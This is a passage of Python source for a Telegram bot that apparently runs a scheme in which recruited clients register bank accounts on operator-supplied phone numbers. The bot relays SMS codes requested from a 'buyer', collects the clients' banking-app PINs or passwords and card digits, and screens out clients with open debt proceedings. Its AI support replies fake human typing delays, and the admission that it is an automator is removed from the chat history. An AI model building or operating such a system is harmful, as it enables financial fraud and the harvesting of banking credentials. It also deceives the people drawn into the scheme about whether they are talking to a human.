        "не пидийш", "не пидойш", "не падаш", "не падош", "не падхо",
        "не работает", "не роботает", "не пашет", "не робит",
        
        # Загальні помилки
        "невірн", "не вірн", "неправильн", "не правильн", 
        "не той", "не такий", "код не той", "не ті коди",
        "помилка", "ошибка", "еррор", "error"
    ]
    for kw in keywords:
        if kw in t:
            return True
    return False

def is_acknowledgment_text(text: str) -> bool:
    t = text.lower().strip().strip('.').strip('!').strip('?')
    
    ack_words = {
        "добре", "ок", "окей", "оки", "хорошо", "ладно", "пон", "поняв", "зрозумів", "дякую", "спасибі", "спасибо",
        "щас", "ща", "секунду", "сек", "хвилину", "хв", "зачекайте", "почекайте", "зроблю", "сделаю", "зараз зроблю",
        "щас сделаю", "сейчас", "минуту", "минутку", "чекайте", "ожидайте", "1 сек", "1сек", "одну сек"
    }
    
    if t in ack_words:
        return True
        
    phrases = [
        "зараз зроблю", "ща зробу", "ща зроблю", "щас зроблю", "щас сделаю", "секунду чекайте",
        "хвилину зачекайте", "почекайте секунду", "зачекайте секунду", "зараз пройду", "сейчас пройду",
        "вже роблю", "уже делаю", "робиться", "делается"
    ]
    for phrase in phrases:
        if t == phrase:
            return True
            
    return False

def parse_and_validate_date(date_str: str) -> str:
    import datetime
    # Заміна роздільників на крапку
    cleaned = re.sub(r'[^\d]', '.', date_str)
    parts = cleaned.split('.')
    if len(parts) != 3:
        return None
    try:
        day = int(parts[0])
        month = int(parts[1])
        year = int(parts[2])
        if year < 100:
            if year > 26:
                year += 1900
            else:
                year += 2000
        dt = datetime.date(year, month, day)
        current_year = datetime.datetime.now().year
        if year < 1930 or year > current_year:
            return None
        return dt.strftime("%d.%m.%Y")
    except ValueError:
        return None

def is_valid_pib(pib: str) -> bool:
    words = pib.strip().split()
    if len(words) < 2 or len(words) > 4:
        return False
        
    stop_words = {
        "хз", "хто", "хтось", "нічого", "ні", "та", "ну", "да", "ок", "окей", "оки", "ладно", 
        "так", "не", "буду", "хочу", "знаю", "робот", "бот", "автоматизатор", "помічник", 
        "підтримка", "адмін", "адміністратор", "це", "це ваш", "це ваше", "я", "ти", "ми", "ви", "вони"
    }
    
    for w in words:
        w_clean = w.lower().strip().strip('.,!?')
        if w_clean in stop_words:
            return False
        if len(w_clean) < 2:
            return False
        if not re.match(r'^[a-zA-Zа-яА-ЯіІїЇєЄґҐ\'\-]+$', w_clean):
            return False
            
    return True

def is_question_or_objection(text: str) -> bool:
    t = text.lower().strip().strip('?').strip('.').strip('!')
    if "?" in text:
        return True
    question_starters = [
        "що таке", "що це", "як ", "якщо", "де ", "куди", "звідки", "навіщо", "для чого", "чому", "нащо",
        "что такое", "что это", "как ", "где ", "куда", "откуда", "зачем", "для чего", "почему",
        "чи обов'язково", "обязательно", "безпечно", "точно", "правда", "хто ви", "кто вы", "це бот", "это бот",
        "не хочу", "не буду", "нащо", "зачем", "що за"
    ]
    for starter in question_starters:
        if t.startswith(starter) or f" {starter}" in t:
            if starter in ["як ", "как "]:
                words = text.strip().split()
                if len(words) >= 2 and all(w[0].isupper() for w in words if w):
                    continue
            return True
    return False

def is_code_success_text(text: str) -> bool:
    t = text.lower().strip()
    keywords = [
        "підійшов", "підійш", "підійшло", "пройшов", "пройшло", "пройш",
        "прийняв", "прийняло", "все ок", "все гуд", "все добре",
        "подошел", "подошло", "прошел", "прошло", "принял", "приняло",
        "все отлично", "все хорошо", "заработало", "сработало", "запустило"
    ]
    for kw in keywords:
        if kw in t:
            return True
    return False

def is_claim_registration_text(text: str) -> bool:
    t = text.lower().strip()
    keywords = [
        "зареєстрував", "зареєструвала", "зареєструвався", "зареєструвалась",
        "все зробив", "все зробила", "все пройшов", "все пройшла",
        "я пройшов", "я пройшла", "я зробив", "я зробила", "я відкрив", "я відкрила",
        "зарегистрировал", "зарегистрировался", "все сделал", "все сделала",
        "все прошел", "все прошла", "я прошел", "я прошла", "я сделал", "я сделала",
        "я открыл", "я открыла"
    ]
    for kw in keywords:
        if kw in t:
            return True
    return False

async def mark_bank_as_failed(client_id: int, bot: Bot):
    session = await db.get_session(client_id)
    if not session or not session['line_id']:
        return
        
    line_id = session['line_id']
    line_info = await db.get_line(line_id)
    bank_name = line_info['bank'] if line_info else "Банк"
    
    # 1. Прибираємо кнопку запиту коду в Telegram
    if session['client_message_id']:
        try:
            await bot.edit_message_reply_markup(
                chat_id=client_id,
                message_id=session['client_message_id'],
                reply_markup=None
            )
        except Exception:
            pass

    # 2. Звільняємо лінію як banned
    await db.set_line_status(line_id, 'banned')
    await db.log_verification_end(client_id, bank_name, 'banned')

    # Оновлюємо статус сесії на 'registered' та скидаємо line_id
    import aiosqlite
    from bot.database import DB_FILE
    async with aiosqlite.connect(DB_FILE) as db_conn:
        await db_conn.execute("UPDATE sessions SET line_id = NULL, client_message_id = NULL, status = 'registered' WHERE client_id = ?", (client_id,))
        await db_conn.commit()

    # 3. Видаляємо пройдений/відкинутий банк з решти
    remaining_banks_str = session['remaining_banks']
    remaining = remaining_banks_str.split(",") if remaining_banks_str else []
    if bank_name in remaining:
        remaining.remove(bank_name)
    
    new_remaining_str = ",".join(remaining)
    await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)

    if not remaining:
        # Всі банки пройдені! Завершуємо роботу
        kbd = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🔄 Розпочати знову")]
            ],
            resize_keyboard=True,
            one_time_keyboard=False,
            is_persistent=True
        )
        await bot.send_message(
            chat_id=client_id,
            text="На жаль, верифікація саме по цьому банку закінчена. Роботу завершили, дякуємо за співпрацю.",
            reply_markup=kbd
        )
        # Сесію НЕ закриваємо автоматично, щоб адмін закрив її вручну по кнопці
        # await db.close_session(client_id)
        
        try:
            username = session.get('username')
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Верифікацію для клієнта @{username or client_id} завершено (останній банк скасовано через реєстрацію на свій номер)."
            )
        except Exception:
            pass
    else:
        # Ще є банки
        await bot.send_message(
            chat_id=client_id,
            text="На жаль, верифікація саме по цьому банку закінчена."
        )

def is_code_request_text(text: str) -> bool:
    if is_code_success_text(text):
        return False
    t = text.lower().strip()
    
    # Прямі запити коду або повідомлення про відправку (близько 60 варіацій)
    trigger_phrases = [
        # Прямі запити коду
        "ще раз", "еще раз", "щераз", "ещераз", "ще один", "еще один",
        "код смс", "смс код", "код пароль", "код з смс", "код із смс", "код из смс",
        "треба код", "треба смс", "треба sms", "надо код", "надо смс",
        "дайте код", "дайте смс", "дайте sms", "дай код", "дай смс",
        "давайте код", "давай код", "чекаю код", "жду код",
        "надішліть код", "надішли код", "скиньте код", "скинь код",
        "отправьте код", "отправь код", "вышлите код", "вышли код",
        "не прийшов код", "не приходить код", "немає коду", "нема коду", "нет кода",
        "не прийшло смс", "не приходить смс", "немає смс", "нема смс", "нет смс",
        "повтор коду", "повторити код", "повтор запиту", "повтори код",
        "ще один код", "новий код", "другий код", "наступний код",
        "код не пришов", "код не приходить", "код не пришел", "код не приходит",
        "код потрібен", "потрібен код", "потрібно код", "потрібна смс",
        "запросити sms-код", "запросити код", "запросити смс-код",
        "запросити смс код", "запросити sms код",
        # Повідомлення про відправку / запит коду користувачем
        "код пішов", "код пошел", "смс пішла", "смс пошла", "код пішло",
        "вже відправив", "вже відправила", "вже надіслав", "вже надіслала",
        "уже отправил", "уже отправила", "уже выслал", "уже выслала",
        "відправив смс", "відправила смс", "надіслав смс", "надіслала смс",
        "отправил смс", "отправила смс", "выслал смс", "выслала смс",
        "надіслав код", "надіслала код", "відправив код", "відправила код",
        "отправил код", "отправила код", "выслал код", "выслала код",
        "надіслати код", "отправить код", "скинути код", "скинуть код",
        "натиснув кнопку", "натиснула кнопку", "нажал кнопку", "нажала кнопку",
        "відправив запит", "отправил запрос", "надіслав запит", "вислав запит",
        "код отправлен", "смс отправлена", "код надіслано", "смс відправлено",
        "відправив уже", "відправила вже", "отправил уже", "отправила уже",
        "все відправив", "все відправила", "все отправил", "все отправила",
        "чекаю на код", "очікую код", "чекаю на смс", "жду смс",
        "код давай", "давай смс", "скинь смс", "скиньте смс",
        "запросив", "запросила", "перезапросив", "перезапросила",
        "перезапросил", "переотправил", "переотправила"
    ]
    
    for phrase in trigger_phrases:
        if phrase in t:
            return True
            
    # Окремі слова-тригери (якщо повідомлення містить це слово або повністю з нього складається)
    single_words = [
        "код", "смс", "sms", "повтор", "повторити", "повторить", "дайте", "треба ще",
        "пішов", "пошел", "пішло", "пошло", "пішла", "пошла", "пошли", "пішли",
        "надіслав", "надіслала", "відправив", "відправила",
        "отправил", "отправила", "выслал", "выслала", "вислав", "вислала",
        "скинув", "скинула", "скинь", "скиньте",
        "надішли", "надішліть", "відправ", "відправте",
        "готово", "відправлено", "отправлено", "надіслано", "выслано",
        "нажал", "нажала", "натиснув", "натиснула", "тицьнув", "тицьнула", "тиснув", "тиснула",
        "запросив", "запросила", "перезапросив", "перезапросила", "перезапросил",
        "переотправил", "переотправила"
    ]
    
    words = re.findall(r'\b\w+\b', t)
    for word in single_words:
        if word in words:
            return True
        if len(word) >= 5 and word in t:
            return True
            
    return False

REFUSAL_KEYWORDS = [
    "нет кода в приложении", "немає коду в додатку", "немае коду в додатку", "немає і не приходить", 
    "нема і не приходить", "нема коду в додатку", "не надходить код", "не приходить код", 
    "не поступает смс", "смс не поступило", "код не поступает", "не поступает код", 
    "код не надходить", "не надіслали смс", "смс не надходить", "не надіслали код", 
    "не приходить смс", "смс не поступает", "смс не приходить", "не надходить смс", 
    "не поступает смс", "код не приходить", "код не надійшов", "код не поступил", 
    "не поступил код", "не приходит код", "код не надійшло", "смс не надійшов", 
    "не приходит смс", "не прислали смс", "не прислали код", "не надійшло смс", 
    "код не приходит", "смс не надійшло", "не надійшов код", "смс не приходит", 
    "не прийшов код", "код не прийшов", "не прийшло смс", "смс не прийшло", 
    "не пришел код", "код не пришел", "не пришло смс", "смс не пришло", "не надсилають", 
    "не поступает", "не приходить", "не присылают", "нічого немає", "не надіслали", 
    "не надходить", "не поступило", "код не идет", "не поступил", "не надійшло", 
    "немає і все", "не приходит", "смс не идет", "не надійшов", "нема нічого", 
    "нічого нема", "не прислали", "ничего нету", "не прийшло", "ничего нет", 
    "не прийшов", "немає коду", "немае коду", "нет кода", "код не йде", 
    "не йде код", "не йде смс", "смс не йде", "немає смс", "не пришло", 
    "немаєкоду", "нема коду", "не пришел", "немае смс", "немакоду", 
    "нема смс", "немаєсмс", "не идет", "немасмс", "не йде", "немає", 
    "пусто", "немае", "нету", "нема", "нет"
]

def is_no_code_text(text: str) -> bool:
    if not text:
        return False
    t = text.lower().strip()
    # Видаляємо знаки пунктуації на початку/кінці, залишаючи літери, цифри та дефіси
    t = re.sub(r'^[^\w\s\-]+|[^\w\s\-]+$', '', t)
    t = re.sub(r'\s+', ' ', t)
    
    if t == "-":
        return True

    for kw in REFUSAL_KEYWORDS:
        if len(kw) <= 4:
            pattern = rf"\b{re.escape(kw)}\b"
            if re.search(pattern, t):
                return True
        else:
            if kw == t or t.startswith(kw) or kw in t:
                return True
                
    return False

async def no_code_message_filter(message: Message) -> bool:
    if not message.text:
        return False
    if not is_no_code_text(message.text):
        return False
    # Перевіряємо статус сесії користувача в БД
    existing_session = await db.get_session(message.from_user.id)
    if existing_session and existing_session['status'] in ('number_assigned', 'waiting_code'):
        return True
    return False

@router.message(no_code_message_filter, StateFilter("*"))
async def handle_universal_no_code(message: Message, state: FSMContext, bot: Bot):
    """Універсальний обробник повідомлень про відсутність коду (працює в будь-якому FSM стані)"""
    # Завжди відповідаємо клієнту шаблонною фразою, не змінюючи статус сесії в БД та не сповіщаючи адміна
    await message.answer("Ще не надійшов, ще чекаємо")

@router.message(F.chat.type == "private", F.text == "Запросити SMS-код")
async def handle_request_code_text(message: Message, state: FSMContext, bot: Bot):
    """Обробник текстового повідомлення 'Запросити SMS-код' від клієнта"""
    client_id = message.from_user.id
    
    # Показуємо статус "typing"
    await bot.send_chat_action(chat_id=client_id, action="typing")
    
    async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
        await message.answer(msg, reply_markup=get_sms_request_keyboard())
        
    await trigger_sms_code_request(client_id, bot, state, notify)




async def simulate_typing(bot: Bot, chat_id: int, duration: float):
    """Імітує процес друку повідомлення в Telegram протягом вказаного часу"""
    start_time = asyncio.get_event_loop().time()
    while asyncio.get_event_loop().time() - start_time < duration:
        try:
            await bot.send_chat_action(chat_id=chat_id, action="typing")
        except Exception:
            pass
        remaining = duration - (asyncio.get_event_loop().time() - start_time)
        sleep_time = min(4.0, remaining)
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)


@router.message(StateFilter(None), F.chat.type == "private", F.text & ~F.text.startswith('/'))
async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bot):
    """Обробник повідомлень поза станами введення даних (захист від флуду + ШІ підтримка)"""
    client_id = message.from_user.id
    
    # Перевіряємо, чи є вже активна сесія у будь-котрому робочому статусі
    existing_session = await db.get_session(client_id)
    if existing_session:
        if existing_session.get('is_paused'):
            logger.info(f"AI bot is paused for client {client_id}. Ignoring automatic AI support response.")
            return
        if existing_session['status'] == 'registered':
            await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
            return
        elif existing_session['status'] == 'waiting_verification':
            if int(existing_session.get('waiting_proceedings') or 0) == 1:
                text_lower = message.text.strip().lower()
                is_yes = any(word in text_lower for word in ["так", "да", "yes", "є", "угу", "+"])
                is_no = any(word in text_lower for word in ["ні", "нет", "no", "нема", "немає", "-"])
                
                if is_no:
                    from bot.handlers.verifier import process_rejection
                    await process_rejection(existing_session, bot, ban=False)
                    await state.clear()
                elif is_yes:
                    await message.answer("Надішліть будь ласка скріншот з Дія, де видно що закрито")
                else:
                    await message.answer("Надішліть будь ласка скріншот з Дія, де видно що закрито")
                return
            else:
                await message.answer("Ваша анкета знаходиться на перевірці у верифікатора. Будь ласка, зачекайте.")
                return
        elif existing_session['status'] not in ('number_assigned', 'waiting_code'):
            await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
            return
        
        # Якщо це коротке повідомлення-підтвердження/пауза, просто ігноруємо
        if message.text and is_acknowledgment_text(message.text):
            logger.info(f"Ігноруємо повідомлення-підтвердження від клієнта {client_id}: {message.text}")
            return

        # Показати статус "typing", щоб користувач знав, що бот обробляє запит
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        sent_codes_count = existing_session.get('sent_codes_count', 0)
        
        # Перевіряємо зміну банку для очищення історії
        state_data = await state.get_data()
        last_bank = state_data.get("last_bank")
        chat_history = state_data.get("chat_history", [])
        if last_bank != current_bank_name:
            chat_history = []
            await state.update_data(last_bank=current_bank_name, chat_history=[])

        # 1. Перевіряємо, чи повідомлення свідчить про невірний код / код не підійшов
        if is_wrong_code_text(message.text or "", chat_history):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Так, потрібен новий код", callback_data="wrongcode_yes")],
                [InlineKeyboardButton(text="Ні, все гаразд", callback_data="wrongcode_no")]
            ])
            await message.answer("Не підійшов код?", reply_markup=keyboard)
            await state.set_state(RegistrationStates.waiting_wrong_code_confirm)
            return

        # 2. Перевіряємо, чи повідомлення схоже на запит SMS-коду
        if is_code_request_text(message.text or ""):
            async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
                await message.answer(msg)
            await state.update_data(support_requests_count=0)
            await trigger_sms_code_request(client_id, bot, state, notify)
            return

        # Перевірка: якщо клієнт пише, що зареєстрував, але жодного коду ще не надіслано
        if is_claim_registration_text(message.text or "") and sent_codes_count == 0:
            await message.answer(
                "Ви не могли зробити реєстрацію по нашому номеру якщо ви не надіслали жодного коду, ви зробили реєстрацію за своїм номером?"
            )
            await state.set_state(RegistrationStates.waiting_own_number_confirm)
            return

        state_data = await state.get_data()
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 20:
            await message.answer(
                "Ви перевищили ліміт запитань до ШІ. Зараз підключиться менеджер і відповість на всі ваші запитання. "
                "Будь ласка, очікуйте."
            )
            return

        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data=client_data,
            current_bank_name=current_bank_name,
            chat_history=chat_history,
            sent_codes_count=sent_codes_count
        )
        
        # Імітація людського друку перед надсиланням відповіді
        import random
        char_count = len(response)
        delay = min(7.0, max(3.0, char_count / 15.0)) + random.uniform(-0.5, 1.0)
        delay = max(3.0, min(8.0, delay))
        await simulate_typing(bot, client_id, delay)
        
        if "[SUCCESS_VERIFICATION]" in response:
            bank_label = current_bank_name if current_bank_name else "банк"
            await state.update_data(support_requests_count=0)
            await message.answer(
                f"Чудово! Будь ласка, надішліть скріншот, який підтверджує успішну реєстрацію в {bank_label}.",
                reply_markup=ReplyKeyboardRemove()
            )
            return

        # Додаємо повідомлення в історію, якщо це не успішна верифікація
        user_msg = {"role": "user", "content": message.text}
        
        raw_response = response
        if "\n\nЯ всього автоматизатор" in response:
            raw_response = response.split("\n\nЯ всього автоматизатор")[0].strip()
        assistant_msg = {"role": "assistant", "content": raw_response}
        
        chat_history.append(user_msg)
        chat_history.append(assistant_msg)
        chat_history = chat_history[-10:] # Зберігаємо останні 10 повідомлень
        await state.update_data(chat_history=chat_history)

        if "[OFFER_AMOBANK_INSTRUCTIONS]" in response:
            await state.set_state(RegistrationStates.waiting_amobank_instruction_confirm)
        if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
            await state.set_state(RegistrationStates.waiting_lviv_success_confirm)

        parts = [p.strip() for p in response.split("[SPLIT]") if p.strip()]
        clean_parts = []
        for part in parts:
            clean_part = re.sub(r'\[[^\]]+\]', '', part).strip()
            if clean_part:
                clean_parts.append(clean_part)

        for i, part in enumerate(clean_parts):
            try:
                await bot.send_chat_action(chat_id=client_id, action="typing")
            except Exception:
                pass
            import random
            char_count = len(part)
            delay = min(4.0, max(1.5, char_count / 15.0)) + random.uniform(-0.3, 0.5)
            await asyncio.sleep(delay)
            
            is_last = (i == len(clean_parts) - 1)
            reply_markup = get_sms_request_keyboard() if is_last else None
            await message.answer(part, reply_markup=reply_markup)

        if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
            import os
            from aiogram.types import FSInputFile
            img_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "lvivbank_success.png")
            if os.path.exists(img_path):
                try:
                    msg = await bot.send_photo(chat_id=client_id, photo=FSInputFile(img_path))
                    file_id = msg.photo[-1].file_id
                    await state.update_data(lviv_template_photo_id=file_id)
                except Exception as e:
                    logger.error(f"Error sending lviv success template photo: {e}")

        # Якщо в відповіді ШІ згадується мультивалютна карта для bank.kd, додатково надсилаємо фото-інструкцію
        is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()
        if is_bank_kd and any(word in response.lower() for word in ["мультивалютн"]):
            import os
            from aiogram.types import FSInputFile
            cards_photo_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "bank.kd_cards_instruction.png")
            if os.path.exists(cards_photo_path):
                try:
                    await bot.send_photo(
                        chat_id=client_id,
                        photo=FSInputFile(cards_photo_path)
                    )
                except Exception as e:
                    logger.error(f"Error sending bank.kd card choice instruction photo in text: {e}")
        return

    # Якщо користувач не у стані анкетування, пропонуємо йому почати з команди /start
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")

async def handle_proceedings_screenshot(message: Message, photo: PhotoSize, session: dict, bot: Bot, state: FSMContext):
    """Обробка скріншоту виконавчих проваджень від клієнта"""
    client_id = session['client_id']
    
    # 1. Завантажуємо фото
    import io
    photo_file = await bot.get_file(photo.file_id)
    photo_bytes = io.BytesIO()
    await bot.download_file(photo_file.file_path, photo_bytes)
    img_data = photo_bytes.getvalue()
    
    # 2. ШІ-аналіз скріншоту
    from bot.openai_client import analyze_proceedings_screenshot
    ai_verdict = await analyze_proceedings_screenshot(img_data)
    
    # 3. Скидаємо прапорець очікування
    await db.set_session_waiting_proceedings(client_id, 0)
    
    # 4. Якщо провадження закриті (CLOSED):
    if "[CLOSED]" in ai_verdict:
        # Пересилаємо чистий скріншот у чат верифікаторів як відповідь (reply) на анкету
        from bot.config import get_anketa_chat_id
        anketa_chat_id = get_anketa_chat_id()
        if anketa_chat_id and session.get('verifier_message_id'):
            try:
                await bot.send_photo(
                    chat_id=anketa_chat_id,
                    photo=photo.file_id,
                    reply_to_message_id=session['verifier_message_id']
                )
            except Exception as e:
                logger.error(f"Не вдалося переслати скріншот проваджень верифікатору: {e}")
    else:
        # Якщо відкриті (OPEN) або не вдалося розпізнати: мінусуємо сесію повністю
        from bot.handlers.verifier import process_rejection
        await process_rejection(session, bot, ban=False)
        await state.clear()

@router.message(StateFilter(None), F.chat.type == "private", F.photo)
async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
    """Обробник скріншоту від користувача (ШІ розпізнавання помилок)"""
    client_id = message.from_user.id
    
    # Перевіряємо, чи є вже активна сесія
    existing_session = await db.get_session(client_id)
    if existing_session:
        if existing_session.get('is_paused'):
            logger.info(f"AI bot is paused for client {client_id}. Ignoring automatic AI photo support response.")
            return
        if existing_session['status'] == 'registered':
            await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
            return
        elif existing_session['status'] == 'waiting_verification':
            if int(existing_session.get('waiting_proceedings') or 0) == 1:
                # Дозволяємо надсилання скріншоту
                pass
            else:
                await message.answer("Ваша анкета знаходиться на перевірці у верифікатора. Будь ласка, зачекайте.")
                return
        elif existing_session['status'] not in ('number_assigned', 'waiting_code'):
            await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
            return
        
        # Беремо фото найкращої якості
        photo = message.photo[-1]
        
        if existing_session['status'] == 'waiting_verification' and int(existing_session.get('waiting_proceedings') or 0) == 1:
            await handle_proceedings_screenshot(message, photo, existing_session, bot, state)
            return
        
        # Зберігаємо останнє фото в стані для можливості відновлення анкетування текстом
        await state.update_data(last_photo_id=photo.file_id)
        
        # 1. Перевіряємо, чи підпис до фото свідчить про невірний код / код не підійшов
        state_data = await state.get_data()
        chat_history = state_data.get("chat_history", [])
        if message.caption and is_wrong_code_text(message.caption, chat_history):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Так, потрібен новий код", callback_data="wrongcode_yes")],
                [InlineKeyboardButton(text="Ні, все гаразд", callback_data="wrongcode_no")]
            ])
            await message.answer("Не підійшов код?", reply_markup=keyboard)
            await state.set_state(RegistrationStates.waiting_wrong_code_confirm)
            return

        # 2. Перевіряємо, чи підпис до фото схожий на запит SMS-коду
        if message.caption and is_code_request_text(message.caption):
            async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
                await message.answer(msg)
            await state.update_data(support_requests_count=0)
            await trigger_sms_code_request(client_id, bot, state, notify)
            return
            
        state_data = await state.get_data()
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 20:
            await message.answer(
                "Ви перевищили ліміт запитань до ШІ. Зараз підключиться менеджер і відповість на всі ваші запитання. "
                "Будь ласка, очікуйте."
            )
            return
            
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        sent_codes_count = existing_session.get('sent_codes_count', 0)
        
        import io
        photo_file = await bot.get_file(photo.file_id)
        photo_bytes = io.BytesIO()
        await bot.download_file(photo_file.file_path, photo_bytes)
        photo_data = photo_bytes.getvalue()
        

        
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.caption,
            image_bytes=photo_data,
            client_data=client_data,
            current_bank_name=current_bank_name,
            sent_codes_count=sent_codes_count
        )
        
        # Імітація людського друку перед надсиланням відповіді
        import random
        char_count = len(response)
        delay = min(7.0, max(3.0, char_count / 15.0)) + random.uniform(-0.5, 1.0)
        delay = max(3.0, min(8.0, delay))
        await simulate_typing(bot, client_id, delay)
        
        is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()
        is_lvivbank = current_bank_name and "lviv" in current_bank_name.lower()
        bank_label = current_bank_name if current_bank_name else "банк"

        # Визначаємо, чи успішно розпізнано скріншот
        is_success = False
        if is_bank_kd:
            is_success = "[KD_CARD_SCREEN]" in response or "[KD_MAIN_SCREEN]" in response or "[SUCCESS_VERIFICATION]" in response
        else:
            is_success = "[SUCCESS_VERIFICATION]" in response

        if is_success:
            await state.update_data(support_requests_count=0)
            card_first4, card_last4 = None, None
            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
            if card_match:
                card_first4 = card_match.group(1)
                card_last4 = card_match.group(2)
                await state.update_data(card_first4=card_first4, card_last4=card_last4)
            
            await state.update_data(success_photo_id=photo.file_id)
            await db.update_session_verification_data(
                client_id, 
                success_photo_id=photo.file_id, 
                card_first4=card_first4, 
                card_last4=card_last4
            )

            if is_lvivbank:
                if existing_session and existing_session.get('client_phone'):
                    # Якщо є збережений телефон для lvivbank, відразу продовжуємо
                    await continue_after_phone(message, state, bot, client_id)
                else:
                    success_text = (
                        "Дякую! Скріншот прийнято.\n\n"
                        "Будь ласка, напишіть Ваш номер телефону?"
                    )
                    await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                    await state.set_state(RegistrationStates.waiting_phone)
            else:
                success_text = (
                    "Дякую! Скріншот прийнято.\n\n"
                    "Який пін-код чи пароль ставили на додаток?"
                )
                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                await state.set_state(RegistrationStates.waiting_password)
            return
        else:
            if "[OFFER_AMOBANK_INSTRUCTIONS]" in response:
                await state.set_state(RegistrationStates.waiting_amobank_instruction_confirm)
            if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
                await state.set_state(RegistrationStates.waiting_lviv_success_confirm)

            parts = [p.strip() for p in response.split("[SPLIT]") if p.strip()]
            clean_parts = []
            for part in parts:
                clean_part = re.sub(r'\[[^\]]+\]', '', part).strip()
                if clean_part:
                    clean_parts.append(clean_part)

            for part in clean_parts:
                try:
                    await bot.send_chat_action(chat_id=client_id, action="typing")
                except Exception:
                    pass
                import random
                char_count = len(part)
                delay = min(4.0, max(1.5, char_count / 15.0)) + random.uniform(-0.3, 0.5)
                await asyncio.sleep(delay)
                
                await message.answer(part)

            if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
                import os
                from aiogram.types import FSInputFile
                img_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "lvivbank_success.png")
                if os.path.exists(img_path):
                    try:
                        msg = await bot.send_photo(chat_id=client_id, photo=FSInputFile(img_path))
                        file_id = msg.photo[-1].file_id
                        await state.update_data(lviv_template_photo_id=file_id)
                    except Exception as e:
                        logger.error(f"Error sending lviv success template photo: {e}")

            # Якщо в відповіді ШІ згадується мультивалютна карта для bank.kd, додатково надсилаємо фото-інструкцію
            if is_bank_kd and any(word in response.lower() for word in ["мультивалютн"]):
                import os
                from aiogram.types import FSInputFile
                cards_photo_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "bank.kd_cards_instruction.png")
                if os.path.exists(cards_photo_path):
                    try:
                        await bot.send_photo(
                            chat_id=client_id,
                            photo=FSInputFile(cards_photo_path)
                        )
                    except Exception as e:
                        logger.error(f"Error sending bank.kd card choice instruction photo in photo: {e}")
            return
        
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
async def schedule_waiting_code_reminder(client_id: int, bot: Bot):
    """
    Через 20 секунд перевіряє статус сесії.
    Якщо статус досі 'waiting_code', надсилає повідомлення клієнту.
    """
    await asyncio.sleep(20)
    session = await db.get_session(client_id)
    if session and session['status'] == 'waiting_code':
        try:
            await bot.send_message(
                chat_id=client_id,
                text="Ще очікую поки нададуть код",
                reply_markup=get_sms_request_keyboard()
            )
        except Exception as e:
            print(f"Помилка надсилання автоматичного нагадування клієнту {client_id}: {e}")

async def trigger_sms_code_request(client_id: int, bot: Bot, state: FSMContext, notify_fn) -> bool:
    """
    Уніфікована логіка запиту SMS-коду з перевіркою cooldown (30 сек).
    """
    import time
    state_data = await state.get_data()
    last_request_time = state_data.get("last_code_request_time", 0)
    current_time = time.time()
    
    cooldown_str = await db.get_setting("sms_cooldown_seconds", "30")
    try:
        cooldown = int(cooldown_str)
    except (ValueError, TypeError):
        cooldown = 30
        
    elapsed = current_time - last_request_time
    if elapsed < cooldown:
        remaining = int(cooldown - elapsed)
        await notify_fn(f"Почекайте ще {remaining} сек. перед наступним запитом коду!", is_error=True)
        return False
        
    session = await db.get_session(client_id)
    if not session or session['status'] == 'completed':
        await notify_fn("Сесія не знайдена або вже завершена.", is_error=True)
        return False
        
    line_id = session['line_id']
    if not line_id:
        await notify_fn("Вам ще не призначено лінію.", is_error=True)
        return False
 
    line_info = await db.get_line(line_id)
    line_num = line_info['line_id'] if line_info else line_id
    bank_name = line_info['bank'] if line_info else "Невідомий банк"

    is_retry = session['status'] == 'waiting_code'

    # Оновлюємо статус сесії на очікування коду
    await db.set_session_status(client_id, 'waiting_code')
    await state.update_data(last_code_request_time=current_time)


    
    # Запускаємо таймер на 20 секунд для автоматичного сповіщення клієнта
    asyncio.create_task(schedule_waiting_code_reminder(client_id, bot))

    # Отримуємо шаблони повідомлень для скупщика (Giver) з бази даних
    giver_format = await db.get_setting("giver_request_format", "Запрос {line_id} {bank_name}")
    giver_retry_format = await db.get_setting("giver_request_retry_format", "Запрос {line_id} {bank_name} (ПОВТОРНО)")

    import random
